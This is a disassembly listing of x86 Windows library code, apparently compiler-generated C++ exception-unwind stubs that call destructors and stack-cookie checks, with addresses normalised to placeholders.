mov ecx [ edx - 0x348 ]
xor ecx eax
call sub_100242d7
mov ecx [ edx - 0x4 ]
xor ecx eax
call sub_100242d7
mov eax r--data
jmp sub_10027eaa
sub_1004eb4e
mov eax [ ebp - 0x10 ]
and eax 0x1
je r-xdata
retn
and [ ebp - 0x10 ] 0xfffffffe
mov ecx [ ebp + 0x8 ]
add ecx 0x54
jmp sub_1000d0c7
sub_1004eb6a
mov ecx [ ebp + 0x8 ]
add ecx 0x4
jmp sub_1000cab6
sub_1004eb75
mov ecx [ ebp + 0x8 ]
add ecx 0x4
jmp sub_100101c5
sub_1004eb80
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x14 ]
xor ecx eax
call sub_100242d7
mov eax r--data
jmp sub_10027eaa
sub_1004eb9b
mov eax [ ebp - 0x10 ]
and eax 0x1
je r-xdata
retn
and [ ebp - 0x10 ] 0xfffffffe
mov ecx [ ebp + 0x8 ]
add ecx 0x58
jmp sub_1000d0c7
sub_1004ebb7
mov ecx [ ebp + 0x8 ]
add ecx 0x8
jmp sub_1000cafb
sub_1004ebc2
mov ecx [ ebp + 0x8 ]
add ecx 0x8
jmp sub_100101c5
sub_1004ebcd
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x14 ]
xor ecx eax
call sub_100242d7
mov eax r--data
jmp sub_10027eaa
sub_1004ebe8
mov ecx [ ebp - 0x10 ]
jmp sub_1000d109
sub_1004ebf0
mov ecx [ ebp - 0x10 ]
add ecx 0x18
jmp sub_10012639
sub_1004ebfb
mov edi [ ebp - 0x10 ]
add edi 0x34
jmp sub_1000211e
sub_1004ec06
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x14 ]
xor ecx eax
call sub_100242d7
mov eax r--data
jmp sub_10027eaa
sub_1004ec21
lea eax [ ebp - 0x34 ]
jmp sub_1000d7e7
sub_1004ec29
lea ecx [ ebp - 0x2c ]
jmp sub_1000206b
sub_1004ec31
mov edx [ esp + 0x8 ]
lea eax [ edx - 0x3c ]
mov ecx [ edx - 0x40 ]
xor ecx eax
call sub_100242d7
mov eax r--data
jmp sub_10027eaa
sub_1004ec4c
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x14 ]
xor ecx eax
call sub_100242d7
mov eax r--data
jmp sub_10027eaa
sub_1004ec67
lea ecx [ ebp + 0xc ]
jmp sub_10003c49
sub_1004ec6f
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x14 ]
xor ecx eax
call sub_100242d7
mov eax r--data
jmp sub_10027eaa
sub_1004ec8a
lea ecx [ ebp + 0xc ]
jmp sub_10003c49
sub_1004ec92
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x14 ]
xor ecx eax
call sub_100242d7
mov eax r--data
jmp sub_10027eaa
sub_1004ecad
lea eax [ ebp - 0x28 ]
push eax
call sub_1000d05d
retn
sub_1004ecb7
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x2c ]
xor ecx eax
call sub_100242d7
mov eax r--data
jmp sub_10027eaa
sub_1004ecd2
lea eax [ ebp - 0x24 ]
push eax
call sub_1000d05d
retn
sub_1004ecdc
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x28 ]
xor ecx eax
call sub_100242d7
mov eax r--data
jmp sub_10027eaa
sub_1004ecf7
lea eax [ ebp - 0x20 ]
push eax
call sub_1000d05d
retn
sub_1004ed01
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x24 ]
xor ecx eax
call sub_100242d7
mov eax r--data
jmp sub_10027eaa
sub_1004ed1c
mov ecx [ ebp - 0x10 ]
jmp sub_1000d109
sub_1004ed24
mov edi [ ebp - 0x10 ]
add edi 0x18
jmp sub_1000211e
sub_1004ed2f
mov ecx [ ebp - 0x10 ]
add ecx 0x11c
jmp sub_1000d16f
sub_1004ed3d
mov ecx [ ebp - 0x10 ]
add ecx 0x140
jmp sub_1000d16f
sub_1004ed4b
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x14 ]
xor ecx eax
call sub_100242d7
mov eax r--data
jmp sub_10027eaa
sub_1004ed66
lea ecx [ ebp - 0x850 ]
jmp sub_1000206b
sub_1004ed71
lea ecx [ ebp - 0x834 ]
jmp sub_10022c19
sub_1004ed7c
lea ecx [ ebp - 0x850 ]
jmp sub_1000206b
sub_1004ed87
mov eax [ ebp - 0x818 ]
and eax 0x1
je r-xdata
retn
and [ ebp - 0x818 ] 0xfffffffe
mov esi [ ebp - 0x81c ]
jmp sub_100149ee
sub_1004eda9
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x87c ]
xor ecx eax
call sub_100242d7
mov ecx [ edx - 0x4 ]
xor ecx eax
call sub_100242d7
mov eax r--data
jmp sub_10027eaa
sub_1004edd1
lea ecx [ ebp - 0x18 ]
jmp sub_10015720
sub_1004edd9
lea ecx [ ebp - 0x3c ]
jmp sub_10012639
sub_1004ede1
lea eax [ ebp - 0x20 ]
jmp sub_1000d7e7
sub_1004ede9
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x40 ]
xor ecx eax
call sub_100242d7
mov eax r--data
jmp sub_10027eaa
sub_1004ee04
lea ecx [ ebp - 0x7c ]
jmp sub_1000206b
sub_1004ee0c
lea esi [ ebp - 0x50 ]
jmp sub_100149ee
sub_1004ee14
lea esi [ ebp - 0xb4 ]
jmp sub_100149ee
sub_1004ee1f
lea ecx [ ebp - 0x7c ]
jmp sub_1000206b
sub_1004ee27
lea esi [ ebp - 0xb4 ]
jmp sub_100149ee
sub_1004ee32
lea ecx [ ebp - 0x98 ]
jmp sub_1000206b
sub_1004ee3d
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x130 ]
xor ecx eax
call sub_100242d7
mov ecx [ edx - 0x8 ]
xor ecx eax
call sub_100242d7
mov eax r--data
jmp sub_10027eaa
sub_1004ee65
lea eax [ ebp - 0x34 ]
jmp sub_10001435
sub_1004ee6d
push [ ebp - 0x14 ]
call sub_100242e6
pop ecx
retn
sub_1004ee77
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x38 ]
xor ecx eax
call sub_100242d7
mov eax r--data
jmp sub_10027eaa
sub_1004ee92
lea eax [ ebp - 0x20 ]
push eax
call sub_1000d05d
retn
sub_1004ee9c
lea ecx [ ebp - 0x18 ]
jmp sub_10003c49
sub_1004eea4
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x2c ]
xor ecx eax
call sub_100242d7
mov eax r--data
jmp sub_10027eaa
sub_1004eebf
lea eax [ ebp - 0x28 ]
push eax
call sub_1000d05d
retn
sub_1004eec9
lea ecx [ ebp - 0x1c ]
jmp sub_10003c49
sub_1004eed1
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x34 ]
xor ecx eax
call sub_100242d7
mov eax r--data
jmp sub_10027eaa
sub_1004eeec
lea eax [ ebp - 0x110 ]
jmp sub_1000219b
sub_1004eef7
lea ecx [ ebp - 0x68 ]
jmp sub_10012639
sub_1004eeff
lea ecx [ ebp - 0x84 ]
jmp sub_10012639
sub_1004ef0a
lea ecx [ ebp - 0x12c ]
jmp sub_10012639
sub_1004ef15
lea ecx [ ebp - 0x4c ]
jmp sub_10012639
sub_1004ef1d
lea ecx [ ebp - 0x148 ]
jmp sub_10012639
sub_1004ef28
lea ecx [ ebp - 0x148 ]
jmp sub_10012639
sub_1004ef33
lea ecx [ ebp - 0x30 ]
jmp sub_10012639
sub_1004ef3b
lea ecx [ ebp - 0x12c ]
jmp sub_10012639
sub_1004ef46
mov edx [ esp + 0x8 ]
lea eax [ edx - 0x14c ]
mov ecx [ edx - 0x150 ]
xor ecx eax
call sub_100242d7
add eax 0xc
mov ecx [ edx - 0x8 ]
xor ecx eax
call sub_100242d7
mov eax r--data
jmp sub_10027eaa
sub_1004ef74
lea eax [ ebp - 0x20 ]
push eax
call sub_1000d05d
retn
sub_1004ef7e
lea ecx [ ebp - 0x18 ]
jmp sub_10003c49
sub_1004ef86
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x2c ]
xor ecx eax
call sub_100242d7
mov eax r--data
jmp sub_10027eaa
sub_1004efa1
mov eax [ ebp + 0x8 ]
jmp sub_1000cb0a
sub_1004efa9
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x10 ]
xor ecx eax
call sub_100242d7
mov eax r--data
jmp sub_10027eaa
sub_1004efc4
lea eax [ ebp - 0x1c ]
jmp sub_1000cb0a
sub_1004efcc
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x20 ]
xor ecx eax
call sub_100242d7
mov eax r--data
jmp sub_10027eaa
sub_1004efe7
lea eax [ ebp - 0x1c ]
push eax
call sub_1000d05d
retn
sub_1004eff1
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x20 ]
xor ecx eax
call sub_100242d7
mov eax r--data
jmp sub_10027eaa
sub_1004f00c
lea ecx [ ebp - 0xb8 ]
jmp sub_1000206b
sub_1004f017
lea ecx [ ebp - 0x9c ]
jmp sub_1000206b
sub_1004f022
mov eax [ ebp - 0x10c ]
and eax 0x1
je r-xdata
retn
and [ ebp - 0x10c ] 0xfffffffe
mov eax [ ebp - 0xd8 ]
jmp sub_1000d7e7
sub_1004f044
lea ecx [ ebp - 0x80 ]
jmp sub_1000206b
sub_1004f04c
lea ecx [ ebp - 0x2c ]
jmp sub_1000206b
sub_1004f054
lea ecx [ ebp - 0x48 ]
jmp sub_1000206b
sub_1004f05c
lea ecx [ ebp - 0x64 ]
jmp sub_1000206b
sub_1004f064
lea eax [ ebp - 0x1a8 ]
jmp sub_10008eb7
sub_1004f06f
lea ecx [ ebp - 0xd4 ]
jmp sub_1000206b
sub_1004f07a
lea ecx [ ebp - 0x1c4 ]
jmp sub_1000206b
sub_1004f085
push [ ebp - 0x108 ]
call sub_100242e6
pop ecx
retn
sub_1004f092
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x1f0 ]
xor ecx eax
call sub_100242d7
mov ecx [ edx - 0x4 ]
xor ecx eax
call sub_100242d7
mov eax r--data
jmp sub_10027eaa
sub_1004f0ba
lea eax [ ebp - 0x1c ]
jmp sub_1000cb0a
sub_1004f0c2
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x20 ]
xor ecx eax
call sub_100242d7
mov eax r--data
jmp sub_10027eaa
sub_1004f0dd
lea eax [ ebp - 0x24 ]
jmp sub_1000cb0a
sub_1004f0e5
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x28 ]
xor ecx eax
call sub_100242d7
mov eax r--data
jmp sub_10027eaa
sub_1004f100
lea eax [ ebp - 0x20 ]
jmp sub_1000cb0a
sub_1004f108
lea ecx [ ebp - 0x18 ]
jmp sub_10003c49
sub_1004f110
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x34 ]
xor ecx eax
call sub_100242d7
mov eax r--data
jmp sub_10027eaa
sub_1004f12b
lea eax [ ebp - 0x28 ]
jmp sub_10001435
sub_1004f133
lea ecx [ ebp - 0x2c ]
jmp sub_100228ee
sub_1004f13b
mov edx [ esp + 0x8 ]
lea eax [ edx - 0x34 ]
mov ecx [ edx - 0x38 ]
xor ecx eax
call sub_100242d7
mov eax r--data
jmp sub_10027eaa
sub_1004f156
lea eax [ ebp - 0xdc ]
jmp sub_1000fb74
sub_1004f161
lea ecx [ ebp - 0x2c ]
jmp sub_1000206b
sub_1004f169
lea ecx [ ebp - 0x2c ]
jmp sub_1000206b
sub_1004f171
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0xe0 ]
xor ecx eax
call sub_100242d7
mov eax r--data
jmp sub_10027eaa
sub_1004f18f
mov eax [ ebp + 0x4c ]
and eax 0x1
je r-xdata
retn
and [ ebp + 0x4c ] 0xfffffffe
mov ecx [ ebp + 0x44 ]
jmp sub_1000206b
sub_1004f1a8
lea eax [ ebp - 0x98 ]
jmp sub_1000fa8d
sub_1004f1b3
lea ecx [ ebp + 0x28 ]
jmp sub_1000206b
sub_1004f1bb
lea ecx [ ebp + 0x28 ]
jmp sub_1000206b
sub_1004f1c3
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x9c ]
xor ecx eax
call sub_100242d7
mov eax r--data
jmp sub_10027eaa
sub_1004f1e1
lea ecx [ ebp - 0xf0 ]
jmp sub_1000206b
sub_1004f1ec
lea ecx [ ebp - 0x64 ]
jmp sub_10012639
sub_1004f1f4
lea ecx [ ebp - 0x48 ]
jmp sub_10012639
sub_1004f1fc
lea ecx [ ebp - 0xd4 ]
jmp sub_10012639
sub_1004f207
lea ecx [ ebp - 0xb8 ]
jmp sub_10012639
sub_1004f212
lea ecx [ ebp - 0x90 ]
jmp sub_100185ac
sub_1004f21d
lea ecx [ ebp - 0x10c ]
jmp sub_10012639
sub_1004f228
lea ecx [ ebp - 0x188 ]
jmp sub_10012639
sub_1004f233
lea ecx [ ebp - 0x80 ]
jmp sub_10012639
sub_1004f23b
lea ecx [ ebp - 0xf0 ]
jmp sub_10012639
sub_1004f246
lea ecx [ ebp - 0x128 ]
jmp sub_10012639
sub_1004f251
lea ecx [ ebp - 0xb8 ]
jmp sub_10012639
sub_1004f25c
lea ecx [ ebp - 0xd4 ]
jmp sub_10012639
sub_1004f267
lea ecx [ ebp - 0x144 ]
jmp sub_10012639
sub_1004f272
lea ecx [ ebp - 0x16c ]
jmp sub_10012639
sub_1004f27d
lea ecx [ ebp - 0x88 ]
jmp sub_10018657
sub_1004f288
lea eax [ ebp - 0x210 ]
jmp sub_10008eb7
sub_1004f293
lea ecx [ ebp - 0x2c ]
jmp sub_1000206b
sub_1004f29b
lea ecx [ ebp - 0x10c ]
jmp sub_1000206b
sub_1004f2a6
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x214 ]
xor ecx eax
call sub_100242d7
mov ecx [ edx - 0x4 ]
xor ecx eax
call sub_100242d7
mov eax r--data
jmp sub_10027eaa
sub_1004f2ce
lea ecx [ ebp - 0x68 ]
jmp sub_10012639
sub_1004f2d6
lea ecx [ ebp - 0x4c ]
jmp sub_10012639
sub_1004f2de
lea ecx [ ebp - 0x78 ]
jmp sub_1001857f
sub_1004f2e6
lea ecx [ ebp - 0x30 ]
jmp sub_1000206b
sub_1004f2ee
mov edx [ esp + 0x8 ]
lea eax [ edx - 0x7c ]
mov ecx [ edx - 0x80 ]
xor ecx eax
call sub_100242d7
add eax 0xc
mov ecx [ edx - 0x8 ]
xor ecx eax
call sub_100242d7
mov eax r--data
jmp sub_10027eaa
sub_1004f316
lea eax [ ebp - 0x28 ]
push eax
call sub_1000d05d
retn
sub_1004f320
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x2c ]
xor ecx eax
call sub_100242d7
mov eax r--data
jmp sub_10027eaa
sub_1004f33b
lea ecx [ ebp - 0x58 ]
jmp sub_1000206b
sub_1004f343
lea ecx [ ebp - 0x74 ]
jmp sub_10012639
sub_1004f34b
lea ecx [ ebp - 0x30 ]
jmp sub_10012639
sub_1004f353
lea ecx [ ebp - 0x58 ]
jmp sub_10012639
sub_1004f35b
mov eax [ ebp - 0x38 ]
and eax 0x1
je r-xdata
retn
and [ ebp - 0x38 ] 0xfffffffe
mov ecx [ ebp - 0x3c ]
jmp sub_10012639
sub_1004f374
lea eax [ ebp - 0x124 ]
jmp sub_1000fb74
sub_1004f37f
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x128 ]
xor ecx eax
call sub_100242d7
mov ecx [ edx - 0x4 ]
xor ecx eax
call sub_100242d7
mov eax r--data
jmp sub_10027eaa
sub_1004f3a7
mov ecx [ ebp + 0x8 ]
jmp sub_1000d109
sub_1004f3af
mov ecx [ ebp + 0x8 ]
add ecx 0x18
jmp sub_10012639
sub_1004f3ba
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x10 ]
xor ecx eax
call sub_100242d7
mov eax r--data
jmp sub_10027eaa
sub_1004f3d5
lea eax [ ebp - 0x5c ]
jmp sub_10001435
sub_1004f3dd
lea eax [ ebp - 0x44 ]
jmp sub_10012ed9
sub_1004f3e5
lea ecx [ ebp - 0x60 ]
jmp sub_10012d3d
sub_1004f3ed
lea ecx [ ebp + 0xac ]
jmp sub_10012639
sub_1004f3f8
lea ecx [ ebp ]
jmp sub_1001402b
sub_1004f400
lea ecx [ ebp + 0xc8 ]
jmp sub_1000206b
sub_1004f40b
lea ecx [ ebp - 0x7c ]
jmp sub_1000206b
sub_1004f413
lea ecx [ ebp - 0x7c ]
jmp sub_1000206b
sub_1004f41b
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0xa8 ]
xor ecx eax
call sub_100242d7
mov ecx [ edx + 0xf0 ]
xor ecx eax
call sub_100242d7
mov eax r--data
jmp sub_10027eaa
sub_1004f446
lea ecx [ ebp - 0x54 ]
jmp sub_10012639
sub_1004f44e
lea ecx [ ebp - 0x2c ]
jmp sub_10012639
sub_1004f456
lea ecx [ ebp - 0x70 ]
jmp sub_10012639
sub_1004f45e
mov eax [ ebp - 0x38 ]
and eax 0x1
je r-xdata
retn
and [ ebp - 0x38 ] 0xfffffffe
mov ecx [ ebp - 0x30 ]
jmp sub_10012639
sub_1004f477
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x74 ]
xor ecx eax
call sub_100242d7
mov ecx [ edx - 0x4 ]
xor ecx eax
call sub_100242d7
mov eax r--data
jmp sub_10027eaa
sub_1004f49c
lea ecx [ ebp - 0x30 ]
jmp sub_10012639
sub_1004f4a4
lea eax [ ebp - 0x40 ]
jmp sub_1000d7e7
sub_1004f4ac
mov eax [ ebp - 0x34 ]
and eax 0x1
je r-xdata
retn
and [ ebp - 0x34 ] 0xfffffffe
mov eax [ ebp - 0x44 ]
jmp sub_1000d7e7
sub_1004f4c5
push [ ebp - 0x38 ]
call sub_100242e6
pop ecx
retn
sub_1004f4cf
mov eax [ ebp - 0x34 ]
and eax 0x2
je r-xdata
retn
and [ ebp - 0x34 ] 0xfffffffd
lea ecx [ ebp - 0x60 ]
jmp sub_1000206b
sub_1004f4e8
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x64 ]
xor ecx eax
call sub_100242d7
mov ecx [ edx - 0x4 ]
xor ecx eax
call sub_100242d7
mov eax r--data
jmp sub_10027eaa
sub_1004f50d
lea ecx [ ebp - 0x64 ]
jmp sub_1000206b
sub_1004f515
lea ecx [ ebp - 0x48 ]
jmp sub_1000206b
sub_1004f51d
lea ecx [ ebp - 0x2c ]
jmp sub_1000206b
sub_1004f525
lea ecx [ ebp - 0x80 ]
jmp sub_10012639
sub_1004f52d
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x98 ]
xor ecx eax
call sub_100242d7
mov ecx [ edx - 0x4 ]
xor ecx eax
call sub_100242d7
mov eax r--data
jmp sub_10027eaa
sub_1004f555
mov eax [ ebp - 0x10 ]
and eax 0x1
je r-xdata
retn
and [ ebp - 0x10 ] 0xfffffffe
mov ecx [ ebp - 0x18 ]
jmp sub_1000206b
sub_1004f56e
lea eax [ ebp - 0xa8 ]
jmp sub_1000fa8d
sub_1004f579
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0xc4 ]
xor ecx eax
call sub_100242d7
mov eax r--data
jmp sub_10027eaa
sub_1004f597
lea eax [ ebp - 0x20 ]
jmp sub_1000cb0a
sub_1004f59f
lea ecx [ ebp - 0x18 ]
jmp sub_10003c49
sub_1004f5a7
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x34 ]
xor ecx eax
call sub_100242d7
mov eax r--data
jmp sub_10027eaa
sub_1004f5c2
lea eax [ ebp - 0x24 ]
push eax
call sub_1000d05d
retn
sub_1004f5cc
lea ecx [ ebp - 0x18 ]
jmp sub_10003c49
sub_1004f5d4
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x30 ]
xor ecx eax
call sub_100242d7
mov eax r--data
jmp sub_10027eaa
sub_1004f5ef
lea eax [ ebp - 0x10c ]
jmp sub_1000fb74
sub_1004f5fa
lea ecx [ ebp - 0x30 ]
jmp sub_1000206b
sub_1004f602
lea ecx [ ebp - 0x30 ]
jmp sub_1000206b
sub_1004f60a
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x110 ]
xor ecx eax
call sub_100242d7
mov eax r--data
jmp sub_10027eaa
sub_1004f628
lea eax [ ebp - 0x114 ]
jmp sub_1000fa8d
sub_1004f633
lea ecx [ ebp - 0x30 ]
jmp sub_1000206b
sub_1004f63b
lea ecx [ ebp - 0x30 ]
jmp sub_1000206b
sub_1004f643
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x118 ]
xor ecx eax
call sub_100242d7
mov eax r--data
jmp sub_10027eaa
sub_1004f661
lea ecx [ ebp - 0x68 ]
jmp sub_10012639
sub_1004f669
lea ecx [ ebp - 0x4c ]
jmp sub_10012639
sub_1004f671
lea ecx [ ebp - 0x30 ]
jmp sub_10012639
sub_1004f679
mov edx [ esp + 0x8 ]
lea eax [ edx - 0x64 ]
mov ecx [ edx - 0x68 ]
xor ecx eax
call sub_100242d7
add eax 0x4
mov ecx [ edx - 0x8 ]
xor ecx eax
call sub_100242d7
mov eax r--data
jmp sub_10027eaa
sub_1004f6a1
lea eax [ ebp - 0xcc ]
jmp sub_1000219b
sub_1004f6ac
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0xd0 ]
xor ecx eax
call sub_100242d7
mov ecx [ edx - 0x8 ]
xor ecx eax
call sub_100242d7
mov eax r--data
jmp sub_10027eaa
sub_1004f6d4
lea ecx [ ebp - 0x1ec ]
jmp sub_1000206b
sub_1004f6df
lea eax [ ebp - 0x2a8 ]
jmp sub_1000d7e7
sub_1004f6ea
lea ecx [ ebp - 0x294 ]
jmp sub_1000206b
sub_1004f6f5
lea ecx [ ebp - 0x120 ]
jmp sub_10011476
sub_1004f700
lea eax [ ebp - 0x278 ]
jmp sub_1000219b
sub_1004f70b
lea ecx [ ebp - 0x294 ]
jmp sub_10012639
sub_1004f716
lea ecx [ ebp - 0x294 ]
jmp sub_10012639
sub_1004f721
lea ecx [ ebp - 0x1d0 ]
jmp sub_10012a81
sub_1004f72c
lea eax [ ebp - 0x2a0 ]
jmp sub_1000d7e7
sub_1004f737
mov edx [ esp + 0x8 ]
lea eax [ edx - 0x2ac ]
mov ecx [ edx - 0x2b0 ]
xor ecx eax
call sub_100242d7
add eax 0xc
mov ecx [ edx - 0x8 ]
xor ecx eax
call sub_100242d7
mov eax r--data
jmp sub_10027eaa
sub_1004f765
mov ecx [ ebp + 0x8 ]
jmp sub_1000d109
sub_1004f76d
mov ecx [ ebp + 0x8 ]
add ecx 0x18
jmp sub_10012639
sub_1004f778
mov edi [ ebp + 0x8 ]
add edi 0x34
jmp sub_1000211e
sub_1004f783
mov ecx [ ebp + 0x10 ]
jmp sub_1000d109
sub_1004f78b
mov ecx [ ebp + 0x8 ]
add ecx 0x138
jmp sub_10012762
sub_1004f799
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x38 ]
xor ecx eax
call sub_100242d7
mov eax r--data
jmp sub_10027eaa
sub_1004f7b4
mov ecx [ ebp + 0x8 ]
jmp sub_1000d109
sub_1004f7bc
mov edi [ ebp + 0x8 ]
add edi 0x18
jmp sub_1000211e
sub_1004f7c7
lea ecx [ ebp - 0x28 ]
jmp sub_10012639
sub_1004f7cf
mov ecx [ ebp + 0x8 ]
add ecx 0x11c
jmp sub_1000d16f
sub_1004f7dd
lea ecx [ ebp - 0x44 ]
jmp sub_10012639
sub_1004f7e5
mov ecx [ ebp + 0x8 ]
add ecx 0x140
jmp sub_1000d16f
sub_1004f7f3
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x48 ]
xor ecx eax
call sub_100242d7
mov eax r--data
jmp sub_10027eaa
sub_1004f80e
lea eax [ ebp - 0x98 ]
jmp sub_1000219b
sub_1004f819
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x9c ]
xor ecx eax
call sub_100242d7
mov eax r--data
jmp sub_10027eaa
sub_1004f837
mov eax [ ebp - 0x20 ]
and eax 0x1
je r-xdata
retn
and [ ebp - 0x20 ] 0xfffffffe
push [ ebp - 0x14 ]
call sub_1000dd28
sub_1004f850
lea ecx [ ebp - 0x64 ]
jmp sub_10012639
sub_1004f858
lea ecx [ ebp ]
jmp sub_10012639
sub_1004f860
lea ecx [ ebp - 0x48 ]
jmp sub_10012639
sub_1004f868
lea ecx [ ebp - 0x1c ]
jmp sub_1003bd26
sub_1004f870
lea ecx [ ebp + 0x1c ]
jmp sub_10012639
sub_1004f878
lea ecx [ ebp + 0x70 ]
jmp sub_10012639
sub_1004f880
lea ecx [ ebp + 0x54 ]
jmp sub_10012639
sub_1004f888
lea ecx [ ebp + 0x38 ]
jmp sub_10012639
sub_1004f890
lea ecx [ ebp + 0x38 ]
jmp sub_1000206b
sub_1004f898
lea eax [ ebp - 0x28 ]
jmp sub_1000d7e7
sub_1004f8a0
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x68 ]
xor ecx eax
call sub_100242d7
mov ecx [ edx + 0x98 ]
xor ecx eax
call sub_100242d7
mov eax r--data
jmp sub_10027eaa
sub_1004f8c8
lea ecx [ ebp - 0x30 ]
jmp sub_10012639
sub_1004f8d0
lea ecx [ ebp - 0x68 ]
jmp sub_10012639
sub_1004f8d8
lea ecx [ ebp - 0x84 ]
jmp sub_10012639
sub_1004f8e3
lea ecx [ ebp - 0x4c ]
jmp sub_10012639
sub_1004f8eb
lea ecx [ ebp - 0x84 ]
jmp sub_10012639
sub_1004f8f6
lea ecx [ ebp - 0x68 ]
jmp sub_10012639
sub_1004f8fe
lea ecx [ ebp - 0x4c ]
jmp sub_10012639
sub_1004f906
lea ecx [ ebp - 0x4c ]
jmp sub_10012639
sub_1004f90e
lea ecx [ ebp - 0x84 ]
jmp sub_10012639
sub_1004f919
lea ecx [ ebp - 0x68 ]
jmp sub_10012639
sub_1004f921
lea ecx [ ebp - 0x84 ]
jmp sub_10012639
sub_1004f92c
lea ecx [ ebp - 0x68 ]
jmp sub_10012639
sub_1004f934
mov edx [ esp + 0x8 ]
lea eax [ edx - 0x8c ]
mov ecx [ edx - 0x90 ]
xor ecx eax
call sub_100242d7
add eax 0xc
mov ecx [ edx - 0x8 ]
xor ecx eax
call sub_100242d7
mov eax r--data
jmp sub_10027eaa
sub_1004f962
lea ecx [ ebp - 0x30 ]
jmp sub_10012639
sub_1004f96a
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x38 ]
xor ecx eax
call sub_100242d7
mov ecx [ edx - 0x8 ]
xor ecx eax
call sub_100242d7
mov eax r--data
jmp sub_10027eaa
sub_1004f98f
lea ecx [ ebp - 0x2c ]
jmp sub_1000206b
sub_1004f997
lea ecx [ ebp - 0x48 ]
jmp sub_10012639
sub_1004f99f
lea edi [ ebp - 0x150 ]
jmp sub_1000211e
sub_1004f9aa
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x158 ]
xor ecx eax
call sub_100242d7
mov ecx [ edx - 0x4 ]
xor ecx eax
call sub_100242d7
mov eax r--data
jmp sub_10027eaa
sub_1004f9d2
lea ecx [ ebp - 0x1c ]
jmp sub_10015720
sub_1004f9da
lea eax [ ebp - 0x14 ]
jmp sub_1000d7e7
sub_1004f9e2
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x28 ]
xor ecx eax
call sub_100242d7
mov eax r--data
jmp sub_10027eaa
sub_1004f9fd
lea ecx [ ebp - 0x80 ]
jmp sub_10012639
sub_1004fa05
lea ecx [ ebp - 0x9c ]
jmp sub_10012639
sub_1004fa10
lea ecx [ ebp - 0x64 ]
jmp sub_10015175
sub_1004fa18
lea ecx [ ebp - 0xb8 ]
jmp sub_10012639
sub_1004fa23
lea ecx [ ebp - 0xb8 ]
jmp sub_10012639
sub_1004fa2e
lea esi [ ebp - 0x3c ]
jmp sub_10015514
sub_1004fa36
lea eax [ ebp - 0xc0 ]
jmp sub_1000d7e7
sub_1004fa41
mov edx [ esp + 0x8 ]
lea eax [ edx - 0xcc ]
mov ecx [ edx - 0xd0 ]
xor ecx eax
call sub_100242d7
add eax 0xc
mov ecx [ edx - 0x8 ]
xor ecx eax
call sub_100242d7
mov eax r--data
jmp sub_10027eaa
sub_1004fa6f
mov eax [ ebp - 0x10 ]
and eax 0x1
je r-xdata
retn
and [ ebp - 0x10 ] 0xfffffffe
mov edi [ ebp - 0x14 ]
jmp sub_1000211e
